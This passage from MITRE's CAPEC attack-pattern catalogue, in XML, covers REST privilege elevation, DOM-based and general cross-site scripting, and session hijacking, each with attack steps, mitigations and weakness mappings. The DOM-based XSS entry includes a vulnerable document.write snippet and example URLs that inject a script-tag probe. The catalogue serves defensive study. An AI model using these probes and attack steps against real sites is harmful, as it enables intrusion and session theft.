         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Implementation: Implement message level security such as HMAC in the HTTP communication</ns0:Mitigation>
            <ns0:Mitigation>Design: Utilize defense in depth, do not rely on a single security mechanism like SSL</ns0:Mitigation>
            <ns0:Mitigation>Design: Enforce principle of least privilege</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>The Rest service provider uses SSL to protect the communications between the service requester (client) to the service provider. In the instance where SSL is terminated before the communications reach the web server, it is very common in enterprise data centers to terminate SSL at a router, firewall, load balancer, proxy or other device, then the adversary can insert a sniffer into the communication stream and gather all the authentication tokens (such as session credentials, username/passwords combinations, and so on). The Rest service requester and service provider do not have any way to detect this attack.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="300" />
            <ns0:Related_Weakness CWE_ID="287" />
            <ns0:Related_Weakness CWE_ID="693" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1040</ns0:Entry_ID>
               <ns0:Entry_Name>Network Sniffing</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-09-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated @Name, Description, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-10-21</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Example_Instances, Extended_Description, Prerequisites</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Previous_Entry_Name Date="2019-09-30">Utilizing REST's Trust in the System Resource to Register Man in the Middle</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="58" Name="Restful Privilege Elevation" Abstraction="Detailed" Status="Draft">
         <ns0:Description>An adversary identifies a Rest HTTP (Get, Put, Delete) style permission method allowing them to perform various malicious actions upon server data due to lack of access control mechanisms implemented within the application service accepting HTTP messages.</ns0:Description>
         <ns0:Extended_Description>
            <html:p>Rest uses standard HTTP (Get, Put, Delete) style permissions methods, but these are not necessarily correlated generally with back end programs. Strict interpretation of HTTP get methods means that these HTTP Get services should not be used to delete information on the server, but there is no access control mechanism to back up this logic. This means that unless the services are properly ACL'd and the application's service implementation are following these guidelines then an HTTP request can easily execute a delete or update on the server side. The attacker identifies a HTTP Get URL such as http://victimsite/updateOrder, which calls out to a program to update orders on a database or other resource. The URL is not idempotent so the request can be submitted multiple times by the attacker, additionally, the attacker may be able to exploit the URL published as a Get method that actually performs updates (instead of merely retrieving data). This may result in malicious or inadvertent altering of data on the server.</html:p>
         </ns0:Extended_Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="1" />
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="180">
               <ns0:Exclude_Related Exclude_ID="515" />
            </ns0:Related_Attack_Pattern>
         </ns0:Related_Attack_Patterns>
         <ns0:Prerequisites>
            <ns0:Prerequisite>The attacker needs to be able to identify HTTP Get URLs. The Get methods must be set to call applications that perform operations other than get such as update and delete.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">It is relatively straightforward to identify an HTTP Get method that changes state on the server side and executes against an over-privileged system interface</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Design: Enforce principle of least privilege</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Ensure that HTTP Get methods only retrieve state and do not alter state on the server side</ns0:Mitigation>
            <ns0:Mitigation>Implementation: Ensure that HTTP methods have proper ACLs based on what the functionality they expose</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>The HTTP Get method is designed to retrieve resources and not to alter the state of the application or resources on the server side. However, developers can easily code programs that accept a HTTP Get request that do in fact create, update or delete data on the server. Both Flickr (http://www.flickr.com/services/api/flickr.photosets.delete.html) and del.icio.us (http://del.icio.us/api/posts/delete) have implemented delete operations using standard HTTP Get requests. These HTTP Get methods do delete data on the server side, despite being called from Get which is not supposed to alter state.</ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="267" />
            <ns0:Related_Weakness CWE_ID="269" />
         </ns0:Related_Weaknesses>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-463" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2014-06-23</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Extended_Description</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="588" Name="DOM-Based XSS" Abstraction="Detailed" Status="Stable">
         <ns0:Description>This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is inserted into the client-side HTML being parsed by a web browser. Content served by a vulnerable web application includes script code used to manipulate the Document Object Model (DOM). This script code either does not properly validate input, or does not perform proper output encoding, thus creating an opportunity for an adversary to inject a malicious script launch a XSS attack. A key distinction between other XSS attacks and DOM-based attacks is that in other XSS attacks, the malicious script runs when the vulnerable web page is initially loaded, while a DOM-based attack executes sometime after the page loads. Another distinction of DOM-based attacks is that in some cases, the malicious script is never sent to the vulnerable web server at all. An attack like this is guaranteed to bypass any server-side filtering attempts to protect users.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="63" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all links visited during a manual traversal of the web application.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Probe identified potential entry points for DOM-based XSS vulnerability] The adversary uses the entry points gathered in the "Explore" phase as a target list and injects various common script payloads and special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. Specific to DOM-based XSS, the adversary is looking for areas where input is being used to directly change the DOM.</ns0:Description>
               <ns0:Technique>Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record results of manual input of XSS probes in known URLs.</ns0:Technique>
               <ns0:Technique>Use a list of HTML special characters to inject into parameters of known URLs and check if they were properly encoded, replaced, or filtered out.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim. In DOM-based XSS, the malicious script might not even be sent to the server, since the victim's browser will manipulate the DOM itself. This can help avoid serve-side detection mechanisms.</ns0:Description>
               <ns0:Technique>Change a URL parameter to include a malicious script tag.</ns0:Technique>
               <ns0:Technique>Add a URL fragment to alter the value of the expected Document object URL.</ns0:Technique>
               <ns0:Technique>Send information gathered from the malicious script to a remote endpoint.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.</ns0:Description>
               <ns0:Technique>Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.</ns0:Technique>
               <ns0:Technique>Put the malicious URL on a public forum, where many victims might accidentally click the link.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>An application that leverages a client-side web browser with scripting enabled.</ns0:Prerequisite>
            <ns0:Prerequisite>An application that manipulates the DOM via client-side scripting.</ns0:Prerequisite>
            <ns0:Prerequisite>An application that failS to adequately sanitize or encode untrusted input.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Medium">Requires the ability to write scripts of some complexity and to inject it through user controlled fields in the system.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>None: No specialized resources are required to execute this type of attack.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Data</ns0:Impact>
               <ns0:Note>A successful DOM-based XSS attack can enable an adversary to exfiltrate sensitive information from the application.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Authorization</ns0:Scope>
               <ns0:Scope>Access Control</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
               <ns0:Note>A successful DOM-based XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Commands</ns0:Impact>
               <ns0:Note>A successful DOM-based XSS attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Impact>Modify Data</ns0:Impact>
               <ns0:Note>A successful DOM-based XSS attack can allow an adversary to tamper with application data.</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Use browser technologies that do not allow client-side scripting.</ns0:Mitigation>
            <ns0:Mitigation>Utilize proper character encoding for all output produced within client-site scripts manipulating the DOM.</ns0:Mitigation>
            <ns0:Mitigation>Ensure that all user-supplied input is validated before use.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Example_Instances>
            <ns0:Example>
               <html:p>Consider a web application that enables or disables some of the fields of a form on the page via the use of a mode parameter provided on the query string.</html:p>
               <html:div style="margin-left:1em;" class="informative">http://my.site.com/aform.html?mode=full</html:div>
               <html:p>The application&#8217;s client-side code may want to print this mode value to the screen to give the users an understanding of what mode they are in. In this example, JavaScript is used to pull the value from the URL and update the HTML by dynamically manipulating the DOM via a document.write() call.</html:p>
               <html:div style="margin-left:1em;" class="informative">&lt;script&gt;document.write("&lt;p&gt;Mode is: " + document.location.href.substring(document.location.href.indexOf('mode=') + 5) + "&lt;/p&gt;");&lt;/script&gt;</html:div>
               <html:p>Notice how the value provided on the URL is used directly with no input validation performed and no output encoding in place. A maliciously crafted URL can thus be formed such that if a victim clicked on the URL, a malicious script would then be executed by the victim&#8217;s browser:</html:p>
               <html:div style="margin-left:1em;" class="attack">http://my.site.com/aform.html?mode=&lt;script&gt;alert('hi');&lt;/script&gt;</html:div>
            </ns0:Example>
            <ns0:Example>
               <html:p>In some DOM-based attacks, the malicious script never gets sent to the web server at all, thus bypassing any server-side protections that might be in place. Consider the previously used web application that displays the mode value. Since the HTML is being generated dynamically through DOM manipulations, a URL fragment (i.e., the part of a URL after the '#' character) can be used.</html:p>
               <html:div style="margin-left:1em;" class="attack">http://my.site.com/aform.html#mode=&lt;script&gt;alert('hi')&lt;/script&gt;</html:div>
               <html:p>In this variation of a DOM-based XSS attack, the malicious script will not be sent to the web server, but will instead be managed by the victim's browser and is still available to the client-side script code.</html:p>
            </ns0:Example>
         </ns0:Example_Instances>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="79" />
            <ns0:Related_Weakness CWE_ID="20" />
            <ns0:Related_Weakness CWE_ID="83" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>Reflected DOM Injection</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-471" />
            <ns0:Reference External_Reference_ID="REF-472" />
            <ns0:Reference External_Reference_ID="REF-618" Section="Testing for DOM Based Cross Site Scripting" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2017-04-15</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-08-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Resources_Required</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2019-04-04</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Related_Weaknesses</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Example_Instances</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="593" Name="Session Hijacking" Abstraction="Standard" Status="Stable">
         <ns0:Description>This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The adversary is able to steal or manipulate an active session and use it to gain unathorized access to the application.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="21" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Discover Existing Session Token] Through varrying means, an adversary will discover and store an existing session token for some other authenticated user session.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Insert Found Session Token] The attacker attempts to insert a found session token into communication with the targeted application to confirm viability for exploitation.</ns0:Description>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Session Token Exploitation] The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim.</ns0:Description>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
         <ns0:Prerequisites>
            <ns0:Prerequisite>An application that leverages sessions to perform authentication.</ns0:Prerequisite>
         </ns0:Prerequisites>
         <ns0:Skills_Required>
            <ns0:Skill Level="Low">Exploiting a poorly protected identity token is a well understood attack with many helpful resources available.</ns0:Skill>
         </ns0:Skills_Required>
         <ns0:Resources_Required>
            <ns0:Resource>The adversary must have the ability to communicate with the application over the network.</ns0:Resource>
         </ns0:Resources_Required>
         <ns0:Consequences>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Gain Privileges</ns0:Impact>
               <ns0:Note>A successful attack can enable an adversary to gain unauthorized access to an application.</ns0:Note>
            </ns0:Consequence>
         </ns0:Consequences>
         <ns0:Mitigations>
            <ns0:Mitigation>Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.</ns0:Mitigation>
         </ns0:Mitigations>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness CWE_ID="287" />
         </ns0:Related_Weaknesses>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1185</ns0:Entry_ID>
               <ns0:Entry_Name>Browser Session Hijacking</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1550.001</ns0:Entry_ID>
               <ns0:Entry_Name>Use Alternate Authentication Material:Application Access Token</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <ns0:Entry_ID>1563</ns0:Entry_ID>
               <ns0:Entry_Name>Remote Service Session Hijacking</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Attacks">
               <ns0:Entry_Name>Session hijacking attack</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-603" Section="Testing for Session Hijacking" />
         </ns0:References>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>CAPEC Content Team</ns0:Submission_Name>
               <ns0:Submission_Organization>The MITRE Corporation</ns0:Submission_Organization>
               <ns0:Submission_Date>2017-04-15</ns0:Submission_Date>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-07-31</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Examples-Instances, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Description, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2020-12-17</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2021-06-24</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-02-22</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Execution_Flow</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CAPEC Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>The MITRE Corporation</ns0:Modification_Organization>
               <ns0:Modification_Date>2022-09-29</ns0:Modification_Date>
               <ns0:Modification_Comment>Updated Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
         </ns0:Content_History>
      </ns0:Attack_Pattern>
      <ns0:Attack_Pattern ID="63" Name="Cross-Site Scripting (XSS)" Abstraction="Standard" Status="Draft">
         <ns0:Description>An adversary embeds malicious scripts in content that will be served to web browsers. The goal of the attack is for the target software, the client-side browser, to execute the script with the users' privilege level. An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute code and scripts. Web browsers, for example, have some simple security controls in place, but if a remote attacker is allowed to execute scripts (through injecting them in to user-generated content like bulletin boards) then these controls may be bypassed. Further, these attacks are very difficult for an end user to detect.</ns0:Description>
         <ns0:Likelihood_Of_Attack>High</ns0:Likelihood_Of_Attack>
         <ns0:Typical_Severity>Very High</ns0:Typical_Severity>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="242" />
            <ns0:Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="107" />
         </ns0:Related_Attack_Patterns>
         <ns0:Execution_Flow>
            <ns0:Attack_Step>
               <ns0:Step>1</ns0:Step>
               <ns0:Phase>Explore</ns0:Phase>
               <ns0:Description>[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.</ns0:Description>
               <ns0:Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record all links visited during a manual traversal of the web application.</ns0:Technique>
               <ns0:Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>2</ns0:Step>
               <ns0:Phase>Experiment</ns0:Phase>
               <ns0:Description>[Probe identified potential entry points for XSS vulnerability] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.</ns0:Description>
               <ns0:Technique>Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.</ns0:Technique>
               <ns0:Technique>Use a proxy tool to record results of manual input of XSS probes in known URLs.</ns0:Technique>
               <ns0:Technique>Use a list of XSS probe strings to inject script into UI entry fields. If possible, the probe strings contain a unique identifier.</ns0:Technique>
               <ns0:Technique>Use a list of XSS probe strings to inject script into resources accessed by the application. If possible, the probe strings contain a unique identifier.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>3</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, they can choose to steal user's credentials in order to reuse or to analyze them later on.</ns0:Description>
               <ns0:Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</ns0:Technique>
               <ns0:Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>4</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</ns0:Description>
               <ns0:Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</ns0:Technique>
               <ns0:Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</ns0:Technique>
            </ns0:Attack_Step>
            <ns0:Attack_Step>
               <ns0:Step>5</ns0:Step>
               <ns0:Phase>Exploit</ns0:Phase>
               <ns0:Description>[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.</ns0:Description>
               <ns0:Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</ns0:Technique>
            </ns0:Attack_Step>
         </ns0:Execution_Flow>
